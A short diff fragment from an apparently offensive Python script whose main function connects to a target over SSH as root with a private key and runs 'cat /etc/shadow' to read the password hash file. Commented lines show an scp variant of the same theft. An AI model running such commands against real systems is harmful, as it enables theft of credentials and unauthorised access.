@@ -51,6 +51,7 @@ def main(ip, port, ssh):
 
 	# cmd = 'echo yes | ssh -i '+rsa+' root@'+ip+' -p '+str(ssh)
 	# #scp -i id_rsa root@ip:/etc/shadow .
+	
 	# foutput = os.popen(cmd)
 
 	cmd = 'echo cat /etc/shadow | ssh -i '+rsa+' root@'+ip+' -p '+str(ssh)
